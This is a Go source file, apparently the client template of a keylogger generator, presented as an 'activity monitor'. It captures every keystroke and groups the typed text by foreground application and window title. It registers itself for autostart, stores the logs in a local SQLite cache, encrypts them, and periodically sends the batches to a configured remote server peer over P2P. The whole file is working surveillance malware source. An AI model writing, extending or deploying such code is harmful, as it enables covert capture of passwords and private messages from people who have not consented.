// GuiKeyStandaloneGo/generator/templates/client_template/main.go
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"

	// Project's shared packages
	"github.com/RIZAmohammadkhan/GuiKeyStandaloneGo/gui_generator_app/pkg/crypto" // For AES encryption for P2P payload
	"github.com/RIZAmohammadkhan/GuiKeyStandaloneGo/gui_generator_app/pkg/p2p"
	"github.com/RIZAmohammadkhan/GuiKeyStandaloneGo/gui_generator_app/pkg/types" // For LogEvent, ApplicationActivity

	// External dependencies
	"github.com/google/uuid" // For parsing CfgClientID
	"gopkg.in/natefinch/lumberjack.v2"
	_ "modernc.org/sqlite" // Pure Go SQLite driver
)

// Global logger for the client application
var (
	clientGlobalLogger *log.Logger
)

// setupLogger initializes the file-based logger.
func setupLogger(logDir, logFile string) error {
	absLogDir := logDir
	if !filepath.IsAbs(logDir) {
		exePath, err := os.Executable()
		if err != nil {
			// Use fmt.Fprintf for critical early errors if logger isn't set up
			fmt.Fprintf(os.Stderr, "CRITICAL: Cannot get executable path for logger: %v. Using current directory for logs.\n", err)
			absLogDir = "." // Fallback
		} else {
			absLogDir = filepath.Join(filepath.Dir(exePath), logDir)
		}
	}

	if err := os.MkdirAll(absLogDir, 0755); err != nil {
		return fmt.Errorf("failed to create log directory %s: %w", absLogDir, err)
	}

	logPath := filepath.Join(absLogDir, logFile)

	// Configure lumberjack for diagnostic log rotation
	ljLogger := &lumberjack.Logger{
		Filename:   logPath,
		MaxSize:    int(CfgDiagnosticLogMaxSizeMB), // MaxSize in megabytes
		MaxBackups: CfgDiagnosticLogMaxBackups,
		MaxAge:     CfgDiagnosticLogMaxAgeDays, // MaxAge in days
		Compress:   false,                      // Compress rotated files (optional)
		LocalTime:  true,
	}

	clientGlobalLogger = log.New(ljLogger, "CLIENT: ", log.LstdFlags|log.Lshortfile)
	clientGlobalLogger.Printf(
		"Client diagnostic logger initialized (Level: %s). Log file: %s, MaxSizeMB: %d, MaxBackups: %d, MaxAgeDays: %d",
		CfgInternalLogLevel, logPath, CfgDiagnosticLogMaxSizeMB, CfgDiagnosticLogMaxBackups, CfgDiagnosticLogMaxAgeDays,
	)
	return nil
}

// activeSessionData holds data for the current application session.
type activeSessionData struct {
	startTime          time.Time
	pid                uint32
	applicationName    string
	initialWindowTitle string
	typedText          strings.Builder
}

// reset reinitializes the active session data.
func (s *activeSessionData) reset(start time.Time, pid uint32, appName, title string) {
	s.startTime = start
	s.pid = pid
	s.applicationName = appName
	s.initialWindowTitle = title
	s.typedText.Reset()
}

// isEmpty checks if the current session has accumulated any typed text.
func (s *activeSessionData) isEmpty() bool {
	return s.typedText.Len() == 0
}

// runEventAggregator processes raw monitoring events into structured LogEvents.
func runEventAggregator(
	appEventIn <-chan ActiveAppEvent,
	processedKeyIn <-chan ProcessedKeyEvent,
	logEventOut chan<- types.LogEvent,
	internalQuit <-chan struct{},
	logger *log.Logger,
	clientIDString string,
	periodicFlushInterval time.Duration,
) {
	logger.Println("Event aggregator goroutine started.")

	var currentSession *activeSessionData = nil
	var clientUUID uuid.UUID
	parsedUUID, err := uuid.Parse(clientIDString)
	if err != nil {
		logger.Printf("EVENT AGGR: CRITICAL - Invalid ClientID UUID string '%s': %v. Using zero UUID.", clientIDString, err)
	} else {
		clientUUID = parsedUUID
	}

	flushTicker := time.NewTicker(periodicFlushInterval)
	defer flushTicker.Stop()

	finalizeSession := func(sessionEndTime time.Time, reason string) {
		if currentSession != nil && !currentSession.isEmpty() {
			logEntry := types.NewApplicationActivityEvent(
				clientUUID,
				currentSession.applicationName,
				currentSession.initialWindowTitle,
				currentSession.startTime,
				sessionEndTime,
				strings.TrimSpace(currentSession.typedText.String()),
			)
			logger.Printf("EVENT AGGR: Finalizing session for '%s' (Reason: %s): %d chars. Start: %s, End: %s",
				currentSession.applicationName, reason, currentSession.typedText.Len(),
				currentSession.startTime.Format(time.RFC3339), sessionEndTime.Format(time.RFC3339))

			select {
			case logEventOut <- logEntry:
				logger.Printf("EVENT AGGR: Sent LogEvent (ID: %s) for %s to cache/sync.", logEntry.ID, logEntry.ApplicationName)
			case <-time.After(2 * time.Second):
				logger.Println("EVENT AGGR: Timeout sending LogEvent to output channel. Event might be lost if channel is full and not consumed.")
			}
		}
		currentSession = nil
	}

	for {
		select {
		case appEvent, ok := <-appEventIn:
			if !ok {
				logger.Println("EVENT AGGR: App event channel closed.")
				appEventIn = nil
				if processedKeyIn == nil && appEventIn == nil {
					return
				}
				continue
			}

			shouldStartNewSession := false
			if appEvent.IsSwitch {
				shouldStartNewSession = true
			}
			if currentSession == nil && appEvent.Info.PID != 0 && appEvent.Info.ProcessName != "" {
				shouldStartNewSession = true
			}
			if currentSession != nil && appEvent.Info.PID != 0 && appEvent.Info.PID != currentSession.pid {
				logger.Printf("EVENT AGGR: Detected PID change (%d -> %d) for app '%s' -> '%s'. Forcing new session.",
					currentSession.pid, appEvent.Info.PID, currentSession.applicationName, appEvent.Info.ProcessName)
				shouldStartNewSession = true
			}

			if shouldStartNewSession {
				finalizeSession(appEvent.Timestamp, "App Switch/New App")
				if appEvent.Info.PID != 0 && appEvent.Info.ProcessName != "" {
					currentSession = &activeSessionData{}
					currentSession.reset(appEvent.Timestamp, appEvent.Info.PID, appEvent.Info.ProcessName, appEvent.Info.Title)
					logger.Printf("EVENT AGGR: Started new session for App: %s (PID: %d) - Title: \"%s\"",
						currentSession.applicationName, currentSession.pid, currentSession.initialWindowTitle)
				} else {
					logger.Printf("EVENT AGGR: App focus likely lost or new app info invalid (PID: %d, Name: '%s'). No active session.", appEvent.Info.PID, appEvent.Info.ProcessName)
				}
			} else if currentSession != nil && appEvent.Info.PID == currentSession.pid && appEvent.Info.Title != currentSession.initialWindowTitle {
				logger.Printf("EVENT AGGR: Title updated for current app '%s' (PID: %d) to \"%s\". (IsSwitch from monitor: %t)",
					currentSession.applicationName, currentSession.pid, appEvent.Info.Title, appEvent.IsSwitch)
			}

		case pKey, ok := <-processedKeyIn:
			if !ok {
				logger.Println("EVENT AGGR: Processed key channel closed.")
				processedKeyIn = nil
				if processedKeyIn == nil && appEventIn == nil {
					return
				}
				continue
			}
			if currentSession == nil {
				continue
			}

			if pKey.IsKeyDown {
				textToAppend := ""
				if pKey.IsChar {
					textToAppend = pKey.KeyValue
				} else if !strings.HasPrefix(pKey.KeyValue, "[VK_") {
					textToAppend = pKey.KeyValue
					if pKey.KeyValue == "[ENTER]" || pKey.KeyValue == "[TAB]" || strings.HasPrefix(pKey.KeyValue, "[F") {
						textToAppend += " "
					}
				}
				if textToAppend != "" {
					currentSession.typedText.WriteString(textToAppend)
				}
			}

		case <-flushTicker.C:
			if currentSession != nil && !currentSession.isEmpty() {
				segmentEndTime := time.Now().UTC()
				logEntry := types.NewApplicationActivityEvent(
					clientUUID,
					currentSession.applicationName,
					currentSession.initialWindowTitle,
					currentSession.startTime,
					segmentEndTime,
					strings.TrimSpace(currentSession.typedText.String()),
				)
				select {
				case logEventOut <- logEntry:
					logger.Printf("EVENT AGGR: Sent periodic LogEvent (ID: %s) for '%s' to cache/sync.", logEntry.ID, logEntry.ApplicationName)
				case <-time.After(2 * time.Second):
					logger.Println("EVENT AGGR: Timeout sending periodic LogEvent. Event might be lost.")
				}
				currentSession.typedText.Reset()
				currentSession.startTime = segmentEndTime
			}

		case <-internalQuit:
			logger.Println("Event aggregator goroutine stopping.")
			finalizeSession(time.Now().UTC(), "Client Shutdown")
			return
		}
	}
}

func runSyncManager(
	logStore *LogStore,
	p2pMan *P2PManager,
	internalQuit <-chan struct{},
	wg *sync.WaitGroup,
	logger *log.Logger,
	syncInterval time.Duration,
	maxEventsPerBatch int,
	clientID string,
	encryptionKeyHex string,
	maxRetries uint32,
	retryInterval time.Duration,
) {
	defer wg.Done()
	if syncInterval == 0 {
		logger.Println("SyncManager: Sync interval is 0, sync effectively disabled.")
		<-internalQuit
		logger.Println("SyncManager: Shutting down (was disabled).")
		return
	}
	logger.Printf("SyncManager: Started. Sync interval: %v, Max events/batch: %d", syncInterval, maxEventsPerBatch)

	logger.Println("SyncManager: Performing initial sync check on startup...")
	performSyncCycle(logStore, p2pMan, logger, maxEventsPerBatch, clientID, encryptionKeyHex, maxRetries, retryInterval, internalQuit)

	ticker := time.NewTicker(syncInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			logger.Println("SyncManager: Performing periodic sync check...")
			performSyncCycle(logStore, p2pMan, logger, maxEventsPerBatch, clientID, encryptionKeyHex, maxRetries, retryInterval, internalQuit)

		case <-internalQuit:
			logger.Println("SyncManager: Shutdown signal received. Performing final sync attempt...")
			performSyncCycle(logStore, p2pMan, logger, maxEventsPerBatch, clientID, encryptionKeyHex, maxRetries, retryInterval, internalQuit)
			logger.Println("SyncManager: Shutting down.")
			return
		}
	}
}

func performSyncCycle(
	logStore *LogStore,
	p2pMan *P2PManager,
	logger *log.Logger,
	maxEventsPerBatch int,
	clientID string,
	encryptionKeyHex string,
	maxRetries uint32,
	retryInterval time.Duration,
	internalQuit <-chan struct{},
) {
	eventsToSync, err := logStore.GetBatchForSync(maxEventsPerBatch)
	if err != nil {
		logger.Printf("SyncManager: Error getting batch from LogStore: %v", err)
		return
	}

	if len(eventsToSync) == 0 {
		return
	}
	logger.Printf("SyncManager: Found %d events to sync.", len(eventsToSync))

	jsonData, err := json.Marshal(eventsToSync)
	if err != nil {
		logger.Printf("SyncManager: Error marshaling events to JSON: %v. Batch not sent.", err)
		return
	}

	encryptedPayload, err := crypto.Encrypt(jsonData, encryptionKeyHex)
	if err != nil {
		logger.Printf("SyncManager: Error encrypting payload: %v. Batch not sent.", err)
		return
	}

	var attempt uint32
	for attempt = 0; attempt < maxRetries; attempt++ {
		select {
		case <-internalQuit:
			logger.Println("SyncManager: Shutdown signaled during sync cycle before send. Aborting.")
			return
		default:
		}

		sendCtx, cancelSendCtx := context.WithTimeout(context.Background(), 75*time.Second)
		sendDone := make(chan struct{})
		var response *p2p.LogBatchResponse
		var sendErr error

		go func() {
			defer close(sendDone)
			response, sendErr = p2pMan.SendLogBatch(sendCtx, clientID, encryptedPayload)
		}()

		select {
		case <-sendDone:
		case <-internalQuit:
			logger.Println("SyncManager: Shutdown signaled during P2P send. Cancelling send context.")
			cancelSendCtx()
			<-sendDone
			logger.Println("SyncManager: P2P send cancelled due to shutdown. Aborting sync cycle.")
			return
		}
		cancelSendCtx()

		if sendErr != nil {
			logger.Printf("SyncManager: Attempt %d/%d failed to send log batch: %v", attempt+1, maxRetries, sendErr)
			if attempt < maxRetries-1 {
				logger.Printf("SyncManager: Retrying in %v...", retryInterval)
				select {
				case <-time.After(retryInterval):
				case <-internalQuit:
					logger.Println("SyncManager: Shutdown signaled during retry wait. Aborting sync.")
					return
				}
				continue
			} else {
				logger.Printf("SyncManager: Max retries (%d) reached for sending batch. Batch remains in cache.", maxRetries)
				return
			}
		}

		if response != nil && response.Status == "success" {
			logger.Printf("SyncManager: Batch successfully synced to server. Server processed %d of %d events.", response.EventsProcessed, len(eventsToSync))
			eventIDs := make([]uuid.UUID, len(eventsToSync))
			for i, ev := range eventsToSync {
				eventIDs[i] = ev.ID
			}
			if err := logStore.ConfirmEventsSynced(eventIDs); err != nil {
				logger.Printf("SyncManager: CRITICAL ERROR - Failed to confirm synced events in LogStore: %v. Data may be resent.", err)
			}
			return
		} else {
			errMsg := "unknown server error or nil response"
			if response != nil {
				errMsg = fmt.Sprintf("status='%s', message='%s', server_processed=%d", response.Status, response.Message, response.EventsProcessed)
			}
			logger.Printf("SyncManager: Server indicated failure for batch (Attempt %d/%d): %s.", attempt+1, maxRetries, errMsg)
			if attempt < maxRetries-1 {
				logger.Printf("SyncManager: Retrying server-indicated failure in %v...", retryInterval)
				select {
				case <-time.After(retryInterval):
				case <-internalQuit:
					logger.Println("SyncManager: Shutdown signaled during retry wait. Aborting sync.")
					return
				}
				continue
			} else {
				logger.Printf("SyncManager: Max retries (%d) reached after server-indicated failure. Batch remains in cache.", maxRetries)
				return
			}
		}
	}
}

func main() {
	if err := setupLogger(CfgInternalLogFileDir, CfgInternalLogFileName); err != nil {
		fallbackLogPath := "client_critical_error.log"
		if exeP, errExe := os.Executable(); errExe == nil {
			fallbackLogPath = filepath.Join(filepath.Dir(exeP), "client_critical_error.log")
		} else {
			fmt.Fprintf(os.Stderr, "CRITICAL: Cannot get executable path for fallback log: %v\n", errExe)
		}
		_ = os.WriteFile(fallbackLogPath, []byte(fmt.Sprintf("CRITICAL: Failed to setup logger: %v. Exiting.\n", err)), 0644)
		os.Exit(1)
	}

	clientGlobalLogger.Printf("Client Activity Monitor starting. Version: DEV. ClientID: %s", CfgClientID)
	clientGlobalLogger.Printf("Target Server PeerID: %s", CfgServerPeerID)
	clientGlobalLogger.Printf("Bootstrap Addresses: %v", CfgBootstrapAddresses)
	clientGlobalLogger.Printf("Log File Path (for SQLite DB): %s", CfgLogFilePath) // SQLite path
	// CfgMaxLogFileSizeMB from generated config is used by SQLite manager
	// CfgDiagnosticLogMaxSizeMB is used by the diagnostic text logger (lumberjack)
	if CfgMaxLogFileSizeMB != nil { // This is for SQLite DB
		clientGlobalLogger.Printf("Max Log SQLite DB Size (MB): %d", *CfgMaxLogFileSizeMB)
	} else {
		clientGlobalLogger.Println("Max Log SQLite DB Size (MB): Unlimited")
	}

	exePath, err := os.Executable()
	if err != nil {
		clientGlobalLogger.Printf("Autorun WARNING: Could not get executable path: %v. Autostart setup skipped.", err)
	} else {
		if err := setupAutostart(CfgAppNameForAutorun, exePath, clientGlobalLogger); err != nil {
			clientGlobalLogger.Printf("Autorun WARNING: Failed to set up autostart: %v. Continuing execution.", err)
		}
	}

	dbPath := CfgLogFilePath
	if !filepath.IsAbs(dbPath) {
		if exePath == "" {
			exeP, errExe := os.Executable()
			if errExe != nil {
				clientGlobalLogger.Fatalf("CRITICAL: Failed to get executable path for DB (second attempt): %v", errExe)
			}
			exePath = exeP
		}
		dbPath = filepath.Join(filepath.Dir(exePath), CfgLogFilePath)
	}

	logStore, err := NewLogStore(dbPath, clientGlobalLogger)
	if err != nil {
		clientGlobalLogger.Fatalf("CRITICAL: Failed to initialize LogStore: %v", err)
	}
	defer func() {
		if errClose := logStore.Close(); errClose != nil {
			clientGlobalLogger.Printf("Error closing LogStore: %v", errClose)
		}
	}()

	p2pMan, err := NewP2PManager(clientGlobalLogger, CfgServerPeerID, CfgBootstrapAddresses)
	if err != nil {
		clientGlobalLogger.Fatalf("CRITICAL: Failed to initialize P2PManager: %v", err)
	}
	defer p2pMan.Close()

	osQuitChan := make(chan os.Signal, 1)
	signal.Notify(osQuitChan, syscall.SIGINT, syscall.SIGTERM)
	internalQuitChan := make(chan struct{})
	var wg sync.WaitGroup

	appActivityEventChan := make(chan ActiveAppEvent, 100)
	rawKeyDataChan := make(chan RawKeyData, 256)
	processedKeyDataChan := make(chan ProcessedKeyEvent, 256)
	logEventOutChan := make(chan types.LogEvent, 100)

	wg.Add(1)
	go func() {
		defer wg.Done()
		monitorForegroundApp(appActivityEventChan, 1*time.Second, internalQuitChan, clientGlobalLogger)
	}()
	clientGlobalLogger.Println("Foreground app monitor goroutine started.")

	startKeyboardMonitor(rawKeyDataChan, internalQuitChan, &wg, clientGlobalLogger)
	clientGlobalLogger.Println("Keyboard monitor initialized (starts its own goroutines).")

	wg.Add(1)
	go func() {
		defer wg.Done()
		processRawKeyEvents(rawKeyDataChan, processedKeyDataChan, internalQuitChan, clientGlobalLogger)
	}()
	clientGlobalLogger.Println("Raw key event processor goroutine started.")

	wg.Add(1)
	flushInterval := time.Duration(CfgProcessorPeriodicFlushIntervalSecs) * time.Second
	if CfgProcessorPeriodicFlushIntervalSecs == 0 {
		flushInterval = 24 * 365 * time.Hour
		clientGlobalLogger.Println("Event Aggregator: Periodic flush effectively disabled (interval set to 1 year).")
	}
	go runEventAggregator(appActivityEventChan, processedKeyDataChan, logEventOutChan, internalQuitChan, clientGlobalLogger, CfgClientID, flushInterval)
	clientGlobalLogger.Println("Event aggregator goroutine started.")

	wg.Add(1)
	// CfgMaxLogFileSizeMB (the pointer itself from generated config) is passed for SQLite DB size
	go runSQLiteCacheManager(logStore, logEventOutChan, internalQuitChan, &wg, CfgLocalLogCacheRetentionDays, CfgMaxLogFileSizeMB)
	clientGlobalLogger.Println("SQLite cache manager goroutine started.")

	wg.Add(1)
	go runP2PManager(p2pMan, internalQuitChan, &wg, clientGlobalLogger)
	clientGlobalLogger.Println("P2P manager goroutine started.")

	wg.Add(1)
	syncIntervalDur := time.Duration(CfgSyncIntervalSecs) * time.Second
	if CfgSyncIntervalSecs == 0 {
		syncIntervalDur = 24 * 365 * time.Hour
		clientGlobalLogger.Println("Sync Manager: Sync interval effectively disabled (set to 1 year).")
	}
	retryIntervalDur := time.Duration(CfgRetryIntervalOnFailSecs) * time.Second
	go runSyncManager(
		logStore, p2pMan, internalQuitChan, &wg, clientGlobalLogger,
		syncIntervalDur, CfgMaxEventsPerSyncBatch, CfgClientID,
		CfgEncryptionKeyHex, CfgMaxRetriesPerBatch, retryIntervalDur,
	)
	clientGlobalLogger.Println("Sync manager goroutine started.")

	clientGlobalLogger.Println("Client main components initialized. Waiting for shutdown signal...")
	<-osQuitChan
	clientGlobalLogger.Println("OS shutdown signal received. Signaling goroutines to stop...")
	close(internalQuitChan)

	clientGlobalLogger.Println("Waiting for goroutines to complete...")
	wg.Wait()

	clientGlobalLogger.Println("All client components shut down gracefully.")
}